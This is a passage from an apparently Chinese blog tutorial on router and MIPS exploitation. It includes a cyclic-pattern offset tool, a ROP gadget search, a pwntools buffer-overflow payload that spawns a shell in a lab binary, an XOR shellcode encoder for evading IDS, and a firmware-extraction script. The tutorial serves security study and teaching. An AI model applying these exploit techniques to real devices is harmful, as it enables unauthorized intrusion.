binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">a =<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">b =<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">c = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">count,output</span>):</span><br><span class="line">    <span class="comment"># pattern create</span></span><br><span class="line">    codeStr =<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[*] Create pattern string contains %d characters&#x27;</span>%count</span><br><span class="line">    timeStart = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,count):</span><br><span class="line">        codeStr += a[i/(<span class="number">26</span>*<span class="number">10</span>)] + b[(i%(<span class="number">26</span>*<span class="number">10</span>))/<span class="number">10</span>] + c[i%(<span class="number">26</span>*<span class="number">10</span>)%<span class="number">10</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;ok!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> output:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;[+] output to %s&#x27;</span>%output</span><br><span class="line">        fw = <span class="built_in">open</span>(output,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        fw.write(codeStr)</span><br><span class="line">        fw.close()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;ok!&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> codeStr</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] take time: %.4f s&quot;</span>%(time.time()-timeStart)</span><br><span class="line">       </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patternMatch</span>(<span class="params">searchCode, length=<span class="number">1024</span></span>):</span><br><span class="line">       </span><br><span class="line">   <span class="comment"># pattern search</span></span><br><span class="line">   offset = <span class="number">0</span></span><br><span class="line">   pattern = <span class="literal">None</span></span><br><span class="line">       </span><br><span class="line">   timeStart = time.time()</span><br><span class="line">   is0xHex = re.match(<span class="string">&#x27;^0x[0-9a-fA-F]&#123;8&#125;&#x27;</span>,searchCode)</span><br><span class="line">   isHex = re.match(<span class="string">&#x27;^[0-9a-fA-F]&#123;8&#125;&#x27;</span>,searchCode)</span><br><span class="line">       </span><br><span class="line">   <span class="keyword">if</span> is0xHex:</span><br><span class="line">       <span class="comment">#0x41613141</span></span><br><span class="line">       pattern = binascii.a2b_hex(searchCode[<span class="number">2</span>:])</span><br><span class="line">   <span class="keyword">elif</span> isHex:</span><br><span class="line">       pattern = binascii.a2b_hex(searchCode)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in">print</span>  <span class="string">&#x27;[-] seach Pattern eg:0x41613141&#x27;</span></span><br><span class="line">       sys.exit(<span class="number">1</span>)</span><br><span class="line">       </span><br><span class="line">   source = generate(length,<span class="literal">None</span>)</span><br><span class="line">   offset = source.find(pattern)</span><br><span class="line">       </span><br><span class="line">   <span class="keyword">if</span> offset != -<span class="number">1</span>: <span class="comment"># MBS</span></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&quot;[*] Exact match at offset %d&quot;</span> % offset</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in">print</span></span><br><span class="line">       <span class="string">&quot;[*] No exact matches, looking for likely candidates...&quot;</span></span><br><span class="line">       reverse = <span class="built_in">list</span>(pattern)</span><br><span class="line">       reverse.reverse()</span><br><span class="line">       pattern = <span class="string">&quot;&quot;</span>.join(reverse)</span><br><span class="line">       offset = source.find(pattern)</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span> offset != -<span class="number">1</span>:</span><br><span class="line">           <span class="built_in">print</span> <span class="string">&quot;[+] Possible match at offset %d (adjusted another-endian)&quot;</span> % offset</span><br><span class="line">       </span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;[+] take time: %.4f s&quot;</span> % (time.time() - timeStart)</span><br><span class="line">       </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   parse argument</span></span><br><span class="line"><span class="string">   &#x27;&#x27;&#x27;</span></span><br><span class="line">   parser = argparse.ArgumentParser()</span><br><span class="line">   parser.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--search&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;search for pattern&#x27;</span>)</span><br><span class="line">   parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--create&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;create a pattern&#x27;</span>,action=<span class="string">&#x27;store_true&#x27;</span>)</span><br><span class="line">   parser.add_argument(<span class="string">&#x27;-f&#x27;</span>,<span class="string">&#x27;--file&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;output file name&#x27;</span>,default=<span class="string">&#x27;patternShell.txt&#x27;</span>)</span><br><span class="line">   parser.add_argument(<span class="string">&#x27;-l&#x27;</span>, <span class="string">&#x27;--length&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;length of pattern code&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1024</span>)</span><br><span class="line">   args = parser.parse_args()</span><br><span class="line">   <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   save all argument</span></span><br><span class="line"><span class="string">   &#x27;&#x27;&#x27;</span></span><br><span class="line">   length= args.length</span><br><span class="line">   output = args.file</span><br><span class="line">   createCode = args.create</span><br><span class="line">   searchCode = args.search</span><br><span class="line">       </span><br><span class="line">   <span class="keyword">if</span> createCode <span class="keyword">and</span> (<span class="number">0</span> &lt;args.length &lt;= <span class="number">26</span>*<span class="number">26</span>*<span class="number">10</span>):</span><br><span class="line">       generate(length,output)</span><br><span class="line">   <span class="keyword">elif</span> searchCode <span class="keyword">and</span> (<span class="number">0</span> &lt;args.length &lt;=<span class="number">26</span>*<span class="number">26</span>*<span class="number">10</span>):</span><br><span class="line">       patternMatch(searchCode,length)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in">print</span> <span class="string">&#x27;[-] You shoud chices from [-c -s]&#x27;</span></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&#x27;[-] Pattern length must be less than 6760&#x27;</span></span><br><span class="line">       <span class="built_in">print</span> <span class="string">&#x27;more help: pattern.py -h&#x27;</span></span><br></pre></td></tr></table></figure>
<p>方法二：栈帧分析</p>
<p>可以通过动态&amp;静态结合的方式，找打buf在栈空间中的地址，再找到 <code>saved_ra</code> 的地址，最后计算偏移 <code>offset = saved_ra - buf_addr</code></p>
<h3 id="确定攻击途径"><a href="#确定攻击途径" class="headerlink" title="确定攻击途径"></a>确定攻击途径</h3><p>方法一：命令执行</p>
<p>之前的那个程序中有一个函数<code>do_system_0</code>，但是只能执行 <code>ls -l</code> 命令，我们可以构造一条 ROP Chain，通过溢出漏洞调用该函数并让其执行任意命令，</p>
<p>可以使用<code>mipsrop</code> 插件搜索构造合适的 ROP Chain，使用命令如下</p>
<p>由于该插件是 python2 写的，高版本ida可以直接用2to3工具转换以后使用</p>
<p>在idapython窗口输入以下命令启动</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mipsrop</span><br><span class="line">mipsrop = mipsrop.MIPSROPFinder()</span><br></pre></td></tr></table></figure>
<p>然后在输出窗口的python 命令行里输入以下命令即可</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mipsrop.help()</span><br><span class="line">mipsrop.system()</span><br><span class="line">mipsrop.find(instruction_str)</span><br><span class="line">mipsrop.doubles()</span><br><span class="line">mipsrop.stackfinders() <span class="comment">#使用比较多</span></span><br><span class="line">mipsrop.tails()</span><br><span class="line">mipsrop.summary()</span><br></pre></td></tr></table></figure>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240424150217897.png" alt="image-20240424150217897"></p>
<p>方法二：构造 shellcode</p>
<h3 id="构建漏洞攻击数据"><a href="#构建漏洞攻击数据" class="headerlink" title="构建漏洞攻击数据"></a>构建漏洞攻击数据</h3><p>通过之前的分析我们首先找出 <code>saved_ra - dest = 404</code>，然后我们开始找gadget，通过搜索 *dir 函数末尾找到一段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:00447724 27 A5 02 A0                   addiu   $a1, $sp, 672</span><br><span class="line">.text:00447728 8F A4 04 F0                   lw      $a0, 1264($sp)</span><br><span class="line">.text:0044772C 02 20 30 25                   move    $a2, $s1</span><br><span class="line">.text:00447730 24 02 10 32                   li      $v0, 4146</span><br><span class="line">.text:00447734 00 00 00 0C                   syscall</span><br><span class="line">.text:00447738 8F BF 04 EC                   lw      $ra, 1260($sp)</span><br><span class="line">.text:0044773C 8F BE 04 E8                   lw      $fp, 1256($sp)</span><br><span class="line">.text:00447740 8F B7 04 E4                   lw      $s7, 1252($sp)</span><br><span class="line">.text:00447744 8F B6 04 E0                   lw      $s6, 1248($sp)</span><br><span class="line">.text:00447748 8F B5 04 DC                   lw      $s5, 1244($sp)</span><br><span class="line">.text:0044774C 8F B4 04 D8                   lw      $s4, 1240($sp)</span><br><span class="line">.text:00447750 8F B3 04 D4                   lw      $s3, 1236($sp)</span><br><span class="line">.text:00447754 8F B2 04 D0                   lw      $s2, 1232($sp)</span><br><span class="line">.text:00447758 8F B1 04 CC                   lw      $s1, 1228($sp)</span><br><span class="line">.text:0044775C 8F B0 04 C8                   lw      $s0, 1224($sp)</span><br><span class="line">.text:00447760 03 E0 00 08                   jr      $ra</span><br></pre></td></tr></table></figure>
<p>这段代码不仅可以帮我们重写 <code>$a1</code> 寄存器，还能改写 <code>$ra</code> 寄存器，最后 <code>jr $ra</code>跳转到 <code>do_system_0</code> 函数地址，但是因为这个 gadget 修改了 <code>$fp</code> 等寄存器，所以利用起来有局限性，搞明白机制就行吧。</p>
<p>在执行完函数返回指令后，当前就在 <code>$sp</code> 指向的地方，我们可以看出，<code>addiu   $a1, $sp, 672</code>，可以在 <code>sp + 672</code> 的位置写入 <code>sh</code>，然后在对应的位置给寄存器赋值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># saved_ra - dest = 404</span></span><br><span class="line"></span><br><span class="line">set_a1_addr = struct.pack(<span class="string">&#x27;&gt;L&#x27;</span>, <span class="number">0x00447724</span>)</span><br><span class="line"><span class="comment"># .text:00447724 27 A5 02 A0                   addiu   $a1, $sp, 672</span></span><br><span class="line"><span class="comment"># .text:00447728 8F A4 04 F0                   lw      $a0, 1264($sp)</span></span><br><span class="line"><span class="comment"># .text:0044772C 02 20 30 25                   move    $a2, $s1</span></span><br><span class="line"><span class="comment"># .text:00447730 24 02 10 32                   li      $v0, 4146</span></span><br><span class="line"><span class="comment"># .text:00447734 00 00 00 0C                   syscall</span></span><br><span class="line"><span class="comment"># .text:00447738 8F BF 04 EC                   lw      $ra, 1260($sp)</span></span><br><span class="line"><span class="comment"># .text:0044773C 8F BE 04 E8                   lw      $fp, 1256($sp)</span></span><br><span class="line"><span class="comment"># .text:00447740 8F B7 04 E4                   lw      $s7, 1252($sp)</span></span><br><span class="line"><span class="comment"># .text:00447744 8F B6 04 E0                   lw      $s6, 1248($sp)</span></span><br><span class="line"><span class="comment"># .text:00447748 8F B5 04 DC                   lw      $s5, 1244($sp)</span></span><br><span class="line"><span class="comment"># .text:0044774C 8F B4 04 D8                   lw      $s4, 1240($sp)</span></span><br><span class="line"><span class="comment"># .text:00447750 8F B3 04 D4                   lw      $s3, 1236($sp)</span></span><br><span class="line"><span class="comment"># .text:00447754 8F B2 04 D0                   lw      $s2, 1232($sp)</span></span><br><span class="line"><span class="comment"># .text:00447758 8F B1 04 CC                   lw      $s1, 1228($sp)</span></span><br><span class="line"><span class="comment"># .text:0044775C 8F B0 04 C8                   lw      $s0, 1224($sp)</span></span><br><span class="line"><span class="comment"># .text:00447760 03 E0 00 08                   jr      $ra</span></span><br><span class="line">set_do_system_addr = p32(<span class="number">0x004008F4</span>, endian = <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">set_sp_addr = p32(<span class="number">0x408004E0</span>, endian = <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b&#x27;sh&#x27;</span></span><br><span class="line">cmd += <span class="string">b&#x27;\x00&#x27;</span> * ((<span class="number">4</span> - <span class="built_in">len</span>(cmd)) % <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">404</span> <span class="comment"># padding</span></span><br><span class="line">payload += set_a1_addr <span class="comment"># a1 -&gt; cmd </span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">672</span> <span class="comment"># padding</span></span><br><span class="line">payload += cmd</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">580</span> <span class="comment"># 1256 - len(cmd) - 672</span></span><br><span class="line">payload += set_sp_addr</span><br><span class="line">payload += set_do_system_addr</span><br><span class="line">payload += <span class="string">b&#x27;BBBB&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;passwd&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(payload)</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;qemu-mips-static&#x27;</span>, <span class="string">&#x27;./vuln_system&#x27;</span>])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240425012002313.png" alt="image-20240425012002313"></p>
<h1 id="MIPS-shellcode-开发"><a href="#MIPS-shellcode-开发" class="headerlink" title="MIPS shellcode 开发"></a>MIPS shellcode 开发</h1><h2 id="MIPS-Linux-系统调用"><a href="#MIPS-Linux-系统调用" class="headerlink" title="MIPS Linux 系统调用"></a>MIPS Linux 系统调用</h2><p>MIPS 可以使用 <code>syscall</code> 来实现系统调用，具体方法为：用 <code>$v0</code> 保存需要执行的系统调用的调用号，并按照 MIPS 调用规则构造将要执行的系统调用参数，伪代码为 <code>syscall($v0, $a0,$a1,$a2...)</code></p>
<p>查看系统调用号：<code>/usr/include/mips-linux-gnu/asm/unistd.h</code>，或者 <code>/usr/mips-linux-gnu/include/asm/unistd.h</code></p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240424160121005.png" alt="image-20240424160121005"></p>
<p>放两个链接：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yidianhan/p/13060466.html"><a target="_blank" rel="noopener" href="https://syscall.sh/">Linux System Calls quick and easy (syscall.sh)</a></a> 这个链接没有 mips 的但是有 arm64的</li>
<li><a target="_blank" rel="noopener" href="https://syscalls.w3challs.com/">syscalls.w3challs.com</a> 分为32位和64位,链接中还有arm、mips等架构的系统调用号。</li>
</ul>
<h2 id="shellcode-编写步骤"><a href="#shellcode-编写步骤" class="headerlink" title="shellcode 编写步骤"></a>shellcode 编写步骤</h2><ol>
<li>编写C语言版本的 shellcode 程序</li>
<li>收集这段程序的相关调用号</li>
<li>根据C语言版本的 shellcode 编写汇编语言并依次构造系统调用</li>
<li>编译链接汇编语言的 shellcode，测试并提取机器码</li>
<li>测试提取的 shellcode 是否能运行</li>
</ol>
<h2 id="shellcode-编码优化"><a href="#shellcode-编码优化" class="headerlink" title="shellcode 编码优化"></a>shellcode 编码优化</h2><p>shellcode编码优化包括指令优化和shellcode编码。</p>
<p>绕过以上限制的方法主要有两个：指令优化及shellcode 编码。后者更为通用。</p>
<h3 id="指令优化"><a href="#指令优化" class="headerlink" title="指令优化"></a>指令优化</h3><p>指令优化是指通过选择一些特殊的指令避免在shellcode中直接生成坏字符，比如 <code>NULL</code> 字符。可以使用多条运算指令来规避坏字符。</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240425162239368.png" alt="image-20240425162239368"></p>
<h3 id="shellcode-编码"><a href="#shellcode-编码" class="headerlink" title="shellcode 编码"></a>shellcode 编码</h3><p>首先，所有的字符串函数都会对 <code>NULL</code> 字节进行限制；其次，在某些处理流程中可能会限制 <code>0x0D（\r）、0x0A（\n）、或者0x20（空格）</code>字符；最后，有些函数会要求shellcode必须为可见字符（ascii）或Unicode值。有些时候，还会受到基于特征的IDS系统对shellcode的拦截。</p>
<p>shellcode 编码算法通常包含以下三种：base64编码、alpha_upper编码、xor编码。</p>
<p>shellcode 编码和软件加壳类似，我们可以先专心生成 shellcode 逻辑，然后再使用编码技术规避坏字符，再构造解码程序放在 shellcode 之前。当 exploit 执行成功时，先解码，再执行 shellcode。</p>
<p>我们先使用 python 对 shellcode 进行 xor 编码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xor_encoder</span>(<span class="params">shellcode, key</span>):</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> shellcode:</span><br><span class="line">        data += <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ key)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(data)</span><br></pre></td></tr></table></figure>
<p>key 的生成也是有要求的，首先 key 本身不能是坏字符，其次 key 和 shellcode 异或以后的结果也不能有坏字符，可以写个 <code>generate_key</code> </p>
<h1 id="路由器文件系统提取"><a href="#路由器文件系统提取" class="headerlink" title="路由器文件系统提取"></a>路由器文件系统提取</h1><p>通常情况下，路由器固件包括操作系统内核以及文件系统，包含该路由器中所有的可执行程序和配置文件信息。</p>
<p>跟文件系统会被打包成当前路由器所使用的文件系统格式，然后组装到固件中，Squashfs 是一个制度格式的文件系统，常用的压缩格式为<code>GZIP,LZMA,LZO,XZ</code>，主要优点是有超高压缩率，当进程需要某些文件时，仅将对应部分的压缩文件解压缩。</p>
<h2 id="手动提取"><a href="#手动提取" class="headerlink" title="手动提取"></a>手动提取</h2><p>下载固件 DIR-645 1.04 B11，解压后改名为 firmware.bin </p>
<p>放一些能找到固件的网站</p>
<p><a target="_blank" rel="noopener" href="https://drivers.softpedia.com/manufacturers/dlink/">DLINK driver categories (softpedia.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://rebyte.me/en/">ReByte.me — all drivers in one place</a></p>
<ol>
<li><p><code>file</code> 命令：通过定义的magic签名识别各种格式，但是只能识别是不是某程序，不能判断是否包含某程序，如果前面加入字符只会识别成<code>.data</code>数据文件等</p>
<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/image-20240425170130138.png" alt="image-20240425170130138"></p>
</li>
<li><p>文件内容检索：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strings|grep <span class="comment"># 检索文件系统 magic 签名头</span></span><br><span class="line">hexdump|grep <span class="comment"># 检索 magic 签名偏移</span></span><br><span class="line"><span class="built_in">dd</span>|file <span class="comment"># 确定 magic 签名偏移处的文件类型</span></span><br></pre></td></tr></table></figure>
<p>下面我们就根据以上步骤对 firmware.bin 进行检索</p>
<p>常用的文件系统头部特征如下：</p>
<ul>
<li>cramfs：文件头部特征为 <code>0x28cd3d45</code></li>
<li>squashfs：大致有 <code>sqsh, hsqs, qshs, shsq, hsqt, tqsh, sqlz</code> 7 种</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -ne 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> filename&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">filename=<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查cramfs文件头，由于不知道大小端序，都试试</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\e[34m[*] \e[0mChecking cramfs file header...&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\e[34m[*] \e[0mgrep \\\x28\\\xcd\\\x3d\\\x45&quot;</span></span><br><span class="line">strings_output=$(strings <span class="variable">$filename</span> | grep <span class="string">&quot;python3 -c print(&#x27;\x28\xcd\x3d\x45&#x27;)&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$strings_output</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[32m[+] \e[0m<span class="variable">$strings_output</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[31m[-] \e[0mNULL&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\e[34m[*] \e[0mgrep \\\x45\\\x3d\\\xcd\\\x28&quot;</span></span><br><span class="line">strings_output=$(strings <span class="variable">$filename</span> | grep <span class="string">&quot;python3 -c print(&#x27;\x45\x3d\xcd\x28&#x27;)&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$strings_output</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[32m[+] \e[0m<span class="variable">$strings_output</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[31m[-] \e[0mNULL&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 squashfs</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\e[34m[*] \e[0mChecking squashfs file header...&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\e[34m[*] \e[0mgrep sqsh&quot;</span></span><br><span class="line">strings_output=$(strings <span class="variable">$filename</span> | grep <span class="string">&#x27;sqsh&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$strings_output</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[32m[+] \e[0m<span class="variable">$strings_output</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[31m[-] \e[0mNULL&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\e[34m[*] \e[0mgrep hsqs&quot;</span></span><br><span class="line">strings_output=$(strings <span class="variable">$filename</span> | grep <span class="string">&#x27;hsqs&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$strings_output</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[32m[+] \e[0m<span class="variable">$strings_output</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[31m[-] \e[0mNULL&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\e[34m[*] \e[0mgrep qshs&quot;</span></span><br><span class="line">strings_output=$(strings <span class="variable">$filename</span> | grep <span class="string">&#x27;qshs&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$strings_output</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[32m[+] \e[0m<span class="variable">$strings_output</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[31m[-] \e[0mNULL&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\e[34m[*] \e[0mgrep shsq&quot;</span></span><br><span class="line">strings_output=$(strings <span class="variable">$filename</span> | grep <span class="string">&#x27;shsq&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$strings_output</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\e[32m[+] \e[0m<span 